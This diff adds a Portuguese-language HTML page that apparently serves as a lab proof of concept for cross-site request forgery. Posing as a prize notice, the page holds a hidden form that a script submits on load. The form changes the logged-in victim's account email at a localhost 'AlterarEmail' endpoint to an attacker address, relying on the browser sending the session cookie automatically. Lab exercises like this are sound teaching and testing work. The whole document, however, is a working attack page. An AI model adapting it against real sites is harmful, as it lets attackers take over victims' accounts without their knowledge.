@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8" />
+    <title>Você ganhou um prêmio!</title>
+</head>
+<body>
+    <h1>Parabéns! Você ganhou um prêmio! 🎉</h1>
+    <p>Aguarde, estamos processando...</p>
+
+    <!--
+        PÁGINA MALICIOSA (apenas para o laboratório).
+        Este formulário fica escondido e aponta para o site VÍTIMA.
+        O navegador vai anexar sozinho o cookie de sessão da vítima.
+    -->
+    <form id="ataque" action="https://localhost:7001/Conta/AlterarEmail" method="post" style="display:none">
+        <input type="hidden" name="novoEmail" value="atacante@lab.local" />
+    </form>
+
+    <script>
+        // Envia o formulário automaticamente, sem nenhum clique do usuário.
+        document.getElementById("ataque").submit();
+    </script>
+</body>
+</html>
